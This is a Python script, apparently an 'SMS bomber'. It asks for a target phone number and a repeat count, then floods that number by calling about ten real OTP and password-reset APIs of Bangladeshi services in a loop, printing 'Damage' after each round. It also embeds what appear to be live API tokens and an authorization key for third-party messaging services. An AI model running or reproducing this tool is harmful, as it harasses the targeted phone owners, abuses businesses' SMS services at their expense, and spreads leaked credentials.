import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _______ _    _ _  _____                                         
 |__   __| |  | (_)/ ____|                                        
    | |  | |__| |_| (___                                          
    | |  |  __  | |\___ \                                         
    | |  | |  | | |____) |                                        
   _|_|_ |_|  |_|_|_____/____   __  __                            
  / ____|      / ____|__   __| |  \/  |                           
 | (___  _   _| (___    | | ___| \  / |                           
  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
  ____) | |_| |____) |  | |  __/ |  | |                           
 |_____/ \__, |_____/___|_|\___|_|  |_|                           
  / ____| __/ |     |__   __|                                     
 | |     |___/___  __ _| | ___  _ __                              
 | |    | '__/ _ \/ _` | |/ _ \| '__|                             
 | |____| | |  __/ (_| | | (_) | |                                
  \_____|_|  \___|\__,_|_|\___/|_|                                
 |  _ \                                                           
 | |_) |_   _                                                     
 |  _ <| | | |                                                    
 | |_) | |_| |                                                    
 |____/ \__, |                                                    
         __/ |                                                    
   __  _|___/ _____         _____ _    _       _  ___ ____   __   
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
  \_\                                                        /_/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print ("\033[32m")

print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")


print ("""
          
                       
   ╔═════════════════════════════════╗
   ║ AuTHor   : SHaKiiB ツ           ║
   ║ FaCeBooK : iTzSHaKiiB           ║
   ║ GitHuB   : iTzSHaKiB            ║
   ╚═════════════════════════════════╝
       
 
  
  
""")

number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))


amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))

url1 = "https://contents.jadroo.com/api/v1/user/send-otp"

headers1 = CaseInsensitiveDict()

headers1["Content-Type"]="application/json"

data1 = """{
  \"name\": \"SHaKiB\",
  \"email\": \"GhOsToFkiinG@GMAIL.com\",
  \"mobile_no\": \""""+number+"""\",
  \"password\": \"SHaKiiB123\"
}"""

url11 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"

headers11 = CaseInsensitiveDict()
headers11["Content-Type"]="application/json"

data11 = """{
  \"direct_login\": true,
  \"user\": {
    \"resend\": false,
    \"login\": \"88"""+number+"""\",
    \"type\": {
      \"register\": true
    }
  }
}"""

url13 = "http://27.131.15.19/lstyle/api/lsotprequest"

headers13 = CaseInsensitiveDict()

headers13["Content-Length"]="48"

headers13["Content-Type"]="application/json"

data13 = """{
  \"shortcode\": \"2494905\",
  \"msisdn\": \"88"""+number+"""\"
}"""



url14 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"

url8 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number

url9 = "https://api.jslglobal.co/user-api/v3/send-otp?phone=%2B88"+number+"&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"

headers9 = CaseInsensitiveDict()

headers9["Content-Type"]="application/json"

url10 = "https://api.infobip.com/2fa/1/pin"

headers10 = CaseInsensitiveDict()

headers10["Authorization"]= "App 0dccc81722b82d109e78e8b1e626e571-6eac70e8-5504-4413-8d17-105ec88f7758"

data10 = """{
	\"applicationId\":\"7B3C82E44B99B077CD098612D3AED241\",
	\"from\":\"8804445653055\",
	\"messageId\":\"ED6E2D1CA9138BADF3AA08FDDA4DCBD5\",
	\"to\":\"+88"""+number+"""\"
}"""

url4 = "https://mistrimama.com/backend/api/forgot-password"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = """
{
  \"phone\": \""""+number+"""\"
}
"""

url17 = "https://api.maya-apa.com/api/v5/app/send_otp?phone=88"+number+"&device_id=df180efb23ee233d&source=app&lat=0.00&long=0.00"

headers17 = CaseInsensitiveDict()
headers17["Content-Type"] = "application/json"
headers17["Content-Length"] = "0"


url19 = "https://cms.rupali.com.bd/api/otp/generate-otp/totp/?timestamp=1638601897799"

headers19 = CaseInsensitiveDict()
headers19["Content-Type"] = "application/json"

data19 = """{\"time\":180,\"mobile_number\":\""""+number+"""\"}"""


for i in range(amount):
	
	resp1 = requests.post(url1, headers=headers1, data=data1)
	
	resp4 = requests.post(url4, headers=headers4, data=data4)
	
	resp11 = requests.post(url11, headers=headers11, data=data11)
	
	resp14 = requests.get(url14)
	
	resp8 = requests.get(url8)
	
	resp9 = requests.post(url9, headers=headers9)
	
	resp10 = requests.post(url10, headers=headers10, data=data10)
	
	resp13 = requests.post(url13, headers=headers13,  data=data13)
	
	resp17 = requests.post(url17, headers=headers17)
	
	resp19 = requests.post(url19, headers=headers19, data=data19)
	
	print(str (i+1)+" Damage \n")
	